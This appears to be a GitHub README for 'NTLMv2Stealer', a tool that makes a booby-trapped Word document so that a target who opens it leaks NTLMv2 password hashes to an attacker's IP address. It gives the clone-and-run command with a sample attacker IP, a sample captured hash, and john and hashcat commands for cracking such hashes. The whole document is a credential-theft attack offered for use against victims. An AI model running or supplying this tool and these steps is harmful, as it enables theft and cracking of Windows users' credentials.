# NTLMv2Stealer
NTLMv2 hash stealer from remote windows computer

NTLM (NT LAN Manager) is a Microsoft security protocol that provides authentication, integrity, and confidentiality to users. It is typically used in Windows-based networks and is a challenge-response authentication protocol that uses a combination of a user's password and a system-generated challenge to create a unique cryptographic key for each session. NTLM is considered less secure than more modern protocols, such as Kerberos, and is being phased out by Microsoft in favor of other options.

## Installation & Usage
```sh
cd /opt && sudo git clone https://github.com/HamzMourid00/NTLMv2Stealer.git && cd NTLMv2Stealer && sudo chmod 777 NTLMv2Stealer
./NTLMv2Stealer 192.168.8.90 image.jpg word
```
After the target execute the word file you receive hashes in you session
## How to crack them

### Example
```
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
```
### cracking
```
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```
